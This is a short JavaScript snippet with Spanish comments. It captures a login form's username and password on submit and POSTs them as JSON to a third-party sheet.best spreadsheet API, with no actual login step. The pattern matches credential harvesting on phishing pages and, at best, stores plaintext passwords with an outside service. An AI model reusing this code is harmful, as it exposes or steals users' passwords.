const formulario = document.getElementById('formulario'); //Obtiene el documento con el ID

formulario.addEventListener('submit', async(e) => { e.preventDefault();//Agrega un evento de escucha al formulario cuando se envía 
await fetch('https://sheet.best/api/sheets/910be7d8-f3e5-42a2-9714-91d6ea3ba256', { //Accedemos al link de drive con el que se accede
    method: 'POST',//Método que nos va ayudar a enviar los datos
    mode: 'cors',//especifica que la solicitud se realiza utilizando una política de origen cruzado.
    headers: {  // establece las cabeceras de la solicitud.
    'Content-Type': 'application/json' //indica que los datos se enviarán en formato JSON.
    },
    body: JSON.stringify({ //convierte un objeto JavaScript en una cadena JSON
        "Usuario": formulario.usuario.value,
        "Password": formulario.password.value,
       
        
        
    })
    });

   
});